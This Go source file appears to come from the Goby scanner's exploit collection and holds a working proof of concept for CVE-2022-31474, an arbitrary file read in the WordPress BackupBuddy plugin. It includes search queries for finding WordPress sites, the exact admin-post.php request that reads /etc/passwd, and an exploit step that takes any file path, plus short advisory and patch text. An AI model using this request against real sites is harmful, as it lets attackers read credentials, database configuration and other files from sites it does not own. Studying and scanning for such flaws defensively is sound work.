package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin BackupBuddy Arbitrary File Read Vulnerability (CVE-2022-31474)",
    "Description": "<p>WordPress BackupBuddy plugin is a fast and simple plugin for WordPress backup and restore.</p><p>WordPress plugin BackupBuddy versions 8.5.8.0 to 8.7.4.1 have an information disclosure vulnerability, which stems from an arbitrary file read and download vulnerability.</p>",
    "Product": "WordPress-BackupBuddy",
    "Homepage": "https://ithemes.com/backupbuddy/",
    "DisclosureDate": "2022-09-07",
    "Author": "sharecast",
    "FofaQuery": "header=\"WordPress\" || header=\"api.w.org\" || body=\"/wp-content/themes/\"",
    "GobyQuery": "header=\"WordPress\" || header=\"api.w.org\" || body=\"/wp-content/themes/\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage:</p><p><a href=\"https://ithemes.com/blog/wordpress-vulnerability-report-special-edition-september-6-2022-backupbuddy\">https://ithemes.com/blog/wordpress-vulnerability-report-special-edition-september-6-2022-backupbuddy</a></p>",
    "References": [
        "https://packetstormsecurity.com/files/168292/WordPress-BackupBuddy-8.7.4.1-Arbitrary-File-Read.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "path",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=wp-config&local-download=/etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/bin/bash",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=wp-config&local-download={{{path}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "File Inclusion"
    ],
    "VulType": [
        "File Read",
        "File Inclusion"
    ],
    "CVEIDs": [
        "CVE-2022-31474"
    ],
    "CNNVD": [
        "CNNVD-202209-440"
    ],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "WordPress BackupBuddy 插件 local-download 参数任意文件读取漏洞（CVE-2022-31474）",
            "Product": "WordPress-BackupBuddy",
            "Description": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">WordPress</span>&nbsp;BackupBuddy插件是一款用于WordPress备份和恢复，操作快速简单的插件。</p><p>WordPress 插件 BackupBuddy 8.5.8.0至8.7.4.1版本存在信息泄露漏洞，该漏洞源于存在任意文件读取和下载漏洞。<br></p>",
            "Recommendation": "<p><span style=\"color: rgb(0, 0, 0); font-size: 14px;\">目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页</span>：</p><p><a href=\"https://ithemes.com/blog/wordpress-vulnerability-report-special-edition-september-6-2022-backupbuddy\" rel=\"nofollow\">https://ithemes.com/blog/wordpress-vulnerability-report-special-edition-september-6-2022-backupbuddy</a></p>",
            "Impact": "<p>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取",
                "文件包含"
            ],
            "Tags": [
                "文件读取",
                "文件包含"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin BackupBuddy Arbitrary File Read Vulnerability (CVE-2022-31474)",
            "Product": "WordPress-BackupBuddy",
            "Description": "<p>WordPress BackupBuddy plugin is a fast and simple plugin for WordPress backup and restore.</p><p>WordPress plugin BackupBuddy versions 8.5.8.0 to 8.7.4.1 have an information disclosure vulnerability, which stems from an arbitrary file read and download vulnerability.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage:</p><p><a href=\"https://ithemes.com/blog/wordpress-vulnerability-report-special-edition-september-6-2022-backupbuddy\" rel=\"nofollow\">https://ithemes.com/blog/wordpress-vulnerability-report-special-edition-september-6-2022-backupbuddy</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read",
                "File Inclusion"
            ],
            "Tags": [
                "File Read",
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10710"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}